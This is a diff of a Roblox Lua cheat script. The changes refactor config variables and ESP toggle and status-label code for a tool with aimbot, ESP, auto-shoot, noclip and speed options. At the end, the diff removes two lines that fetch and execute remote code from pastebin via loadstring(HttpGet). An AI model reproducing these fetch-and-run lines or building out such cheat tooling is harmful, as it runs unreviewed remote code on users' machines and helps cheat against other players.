@@ -1,3 +1,13 @@
+local SENSITIVITY_MULTIPLIER = Config.SENSITIVITY_MULTIPLIER
+local AimbotMode = Config.AimbotMode
+local ESPEnabled = Config.ESPEnabled
+local AutoShootEnabled = Config.AutoShootEnabled
+local InfiniteJumpEnabled = Config.InfiniteJumpEnabled
+local NoClipEnabled = Config.NoClipEnabled
+local WalkSpeedEnabled = Config.WalkSpeedEnabled
+local MOVE_SPEED = Config.WalkSpeed
+local Keybind = Config.AimbotKeybind
+
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -6,15 +16,6 @@ local CoreGui = game:GetService("CoreGui")
 
 local LocalPlayer = Players.LocalPlayer
 local Camera = game.Workspace.CurrentCamera
-local Keybind = Enum.UserInputType.MouseButton2
-
-local AimbotMode = Config.AimbotMode
-local ESPEnabled = Config.ESPEnabled
-local AutoShootEnabled = Config.AutoShootEnabled
-local InfiniteJumpEnabled = Config.InfiniteJumpEnabled
-local NoClipEnabled = Config.NoClipEnabled
-local WalkSpeedEnabled = Config.WalkSpeedEnabled
-local MOVE_SPEED = Config.WalkSpeed
 local Keybind = Config.AimbotKeybind
 
 local SPACING = 20
@@ -639,7 +640,7 @@ local CloseSettings = createButton(ScrollingFrame, UDim2.new(0, 40, 0, 40), UDim
 CloseSettings.TextSize = 20
 CloseSettings.BackgroundColor3 = ThemeColors[CurrentTheme].Danger
 
-local espToggle, getESPState, setESPState = createToggle(ScrollingFrame, UDim2.new(0.1, 0, 0, PADDING + (ELEMENT_HEIGHT + SPACING) * 1), "ESP", Config.ESPEnabled)
+local espToggle, getESPState, setESPState = createToggle(ScrollingFrame, UDim2.new(0.1, 0, 0, (PADDING or 0) + (ELEMENT_HEIGHT or 0) + (SPACING or 0)), "ESP", ESPEnabled)
 
 local KeybindLabel = Instance.new("TextLabel")
 KeybindLabel.Size = UDim2.new(0, 250, 0, 30)
@@ -834,11 +835,11 @@ end)
 
 espToggle:GetChildren()[2].InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        Config.ESPEnabled = not Config.ESPEnabled
-        ESPStatus.Text = "ESP: " .. (Config.ESPEnabled and "On" or "Off")
-        ESPStatus.TextColor3 = Config.ESPEnabled and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 170)
-        ESPIcon.TextColor3 = Config.ESPEnabled and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 170)
-        if Config.ESPEnabled then
+        ESPEnabled = not ESPEnabled
+        ESPStatus.Text = "ESP: " .. (ESPEnabled and "On" or "Off")
+        ESPStatus.TextColor3 = ESPEnabled and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
+        ESPIcon.TextColor3 = ESPEnabled and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
+        if ESPEnabled then
             applyESPToAllPlayers()
         else
             removeESPFromAllPlayers()
@@ -1457,8 +1458,8 @@ local function updateUI()
     local currentTime = tick()
     if currentTime - lastUIUpdateTime < 0.2 then return end
     lastUIUpdateTime = currentTime
-ESPStatus.Text = "ESP: " .. (Config.ESPEnabled and "On" or "Off")
-ESPStatus.TextColor3 = Config.ESPEnabled and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 170)
+    ESPStatus.Text = "ESP: " .. (ESPEnabled and "On" or "Off")
+    ESPStatus.TextColor3 = ESPEnabled and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 170)
     ESPIcon.TextColor3 = ESPEnabled and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 170)
     InfiniteJumpStatus.Text = "Infinite Jump: " .. (InfiniteJumpEnabled and "On" or "Off")
     InfiniteJumpStatus.TextColor3 = InfiniteJumpEnabled and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 170)
@@ -1475,6 +1476,3 @@ ESPStatus.TextColor3 = Config.ESPEnabled and ThemeColors[CurrentTheme].Accent or
 end
 
 updateUI()
-
-loadstring(game:HttpGet("https://pastebin.com/raw/aHYKbmCK",true))()
-loadstring(game:HttpGet("https://pastebin.com/raw/M3JUrbmU",true))()
